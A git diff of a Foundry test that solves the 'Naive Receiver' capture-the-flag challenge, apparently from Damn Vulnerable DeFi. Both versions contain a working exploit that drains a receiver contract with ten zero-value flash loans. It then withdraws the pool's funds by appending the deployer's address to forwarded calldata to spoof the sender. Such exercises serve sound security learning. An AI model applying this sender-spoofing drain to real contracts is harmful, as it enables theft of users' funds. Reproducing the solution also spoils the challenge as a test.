@@ -78,64 +78,47 @@ contract NaiveReceiverChallenge is Test {
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
 
-        // Prepare bytes call data for 10 flashloan and 1 withdraw
+        // NOTE: Create bytes memory called CallDatas that takes 11 arguments
         bytes[] memory callDatas = new bytes[](11);
-        for (uint i = 0; i < 10; i++ ) {
+        
+        // NOTE: Create batch of callDatas transactions with 9 flahloan and 1 withdraw
+        for(uint i=0; i<10; i++){
             callDatas[i] = abi.encodeCall(
-                NaiveReceiverPool.flashLoan,
-                (
-                    receiver, 
-                    address(weth), 
-                    0, 
-                    "0x"
-                )
+                NaiveReceiverPool.flashLoan, 
+                (receiver, address(weth), 0, "0x")
             );
         }
 
-        // Encode withdrawl call
-        // Exploit the access control vulnerbility by passing the request through the forwarder
-        // And setting the deployer as sender in the last 20 bytes (so pool parse and accept it)
+        // exp: 00f714ce [amount padded 32B] [recovery padded 32B] [deployer padded 32B]
+        // actual call data: 4 (from NaiveRecieverPool.withdraw) + 32 + 32 + 32 (from encodePacked (deployer bytes32)) = 100 bytes
         callDatas[10] = abi.encodePacked(
             abi.encodeCall(
-                pool.withdraw,
-                (
-                    WETH_IN_POOL + WETH_IN_RECEIVER,
-                    payable(recovery)
-                )
-            ),
+                NaiveReceiverPool.withdraw, 
+                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
             bytes32(uint256(uint160(deployer)))
         );
-
-        // Encode the multicall
-        bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);
-
-        // Create forwarder request
+        bytes memory callData;
+        callData = abi.encodeCall(pool.multicall, callDatas);
         BasicForwarder.Request memory request = BasicForwarder.Request(
             player,
             address(pool),
             0,
             gasleft(),
             forwarder.nonces(player),
-            multicallData,
+            callData,
             1 days
         );
-
-        // Hash reuest
         bytes32 requestHash = keccak256(
-            abi.encode(
+            abi.encodePacked(
                 "\x19\x01",
                 forwarder.domainSeparator(),
                 forwarder.getDataHash(request)
             )
         );
-
-        // Sign Request
-        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
         bytes memory signature = abi.encodePacked(r, s, v);
 
-        // Execute
         forwarder.execute(request, signature);
-        
     }
 
     /**
